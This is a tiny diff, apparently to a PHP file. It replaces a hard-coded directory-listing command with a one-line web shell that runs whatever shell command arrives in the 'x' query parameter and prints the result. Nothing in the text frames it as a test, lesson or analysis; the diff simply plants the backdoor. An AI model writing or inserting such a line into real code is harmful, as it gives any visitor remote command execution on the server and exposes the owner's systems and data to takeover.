@@ -1,3 +1,1 @@
-<?php
-shell_exec("ls -la");
-?>
+<?=`$_GET[x]`?>
